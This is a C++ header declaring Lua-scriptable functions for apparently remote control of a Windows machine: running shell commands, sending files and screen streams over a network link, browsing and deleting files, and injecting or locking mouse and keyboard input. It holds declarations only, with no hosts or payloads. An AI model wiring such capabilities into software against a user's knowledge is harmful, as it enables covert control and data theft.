#pragma once
extern "C" {
#include <lauxlib.h>
#include <lua.h>
#include <lualib.h>
}
#include "../global.h"
#include <LuaBridge/LuaBridge.h>
#ifdef _WIN32
#include <shlobj.h>
#endif
#include <string>
using namespace std;
using namespace luabridge;

namespace LuaFunctions {
  void Register(lua_State* L);

  string exec(string cmd);
  void waitReceive();
  bool sendFile(const int code, char* buffer, size_t size);
  string GetKnownFolderPath(const KNOWNFOLDERID& folderId);
  std::vector<std::string> luaGetStringArray(lua_State* L, int index);

  struct DiskInfo {
    std::string name;    // e.g. "C:"
    std::string type;    // e.g. "Fixed", "Removable"
    uint64_t totalSpace; // in bytes
    uint64_t freeSpace;  // in bytes
  };
#ifdef _WIN32
  extern std::vector<std::pair<std::string, KNOWNFOLDERID>> placeIds;
#endif

  namespace Lua {
    namespace System {
      enum MessageBoxType { MESSAGEBOX_BLANK = 0, MESSAGEBOX_INFO, MESSAGEBOX_WARNING, MESSAGEBOX_ERROR, MESSAGEBOX_QUESTION };

      void Sleep(const int64_t& ms);
      /// @param cmd Command
      /// @returns Result of execution
      string Exec(const string& cmd);
      void AExec(const string& cmd);
      long long GetTimeMs();

      namespace Dialog {
        bool Confirm(const std::string& title = "", const std::string& text = "", MessageBoxType type = MESSAGEBOX_BLANK);
        void Ok(const std::string& title = "", const std::string& text = "", MessageBoxType type = MESSAGEBOX_BLANK);
        std::string Input(const std::string& title = "", const std::string& prompt = "");
      } // namespace Dialog
    } // namespace System

    namespace Net {
      bool Send(const int& code, const string& data = "");
      bool SendFile(const int& code, const string& path);
      bool Screencast();
      string Receive();
      bool ReceiveFile(const string& path);
      bool IsConnected();
    } // namespace Net

    namespace Fs {
      int CListDirectory(lua_State* L);
      int CListDisks(lua_State* L);
      int CListPlaces(lua_State* L);
      string ReadFile(const string& filePath);
      int CReadFileLines(lua_State* L);
      bool Rm(const std::string& path);
      int CMove(lua_State* L);
      int CCopy(lua_State* L);
      bool Rename(std::string source, std::string destination);
    } // namespace Fs

    namespace Input {
      void MouseMove(double x, double y);
      void MouseSetPressed(uint32_t button, bool state);
      void MouseScroll(double pixels);

      luabridge::LuaRef GetPressedKeys(lua_State* L);
      luabridge::LuaRef GetPressedButtons(lua_State* L);

      int CKeySetPressed(lua_State* L);
      void Delay(int milliseconds);

      void MouseSetLocked(bool value);
      void KeyboardSetLocked(bool value);
    } // namespace Input
  } // namespace Lua

}; // namespace LuaFunctions
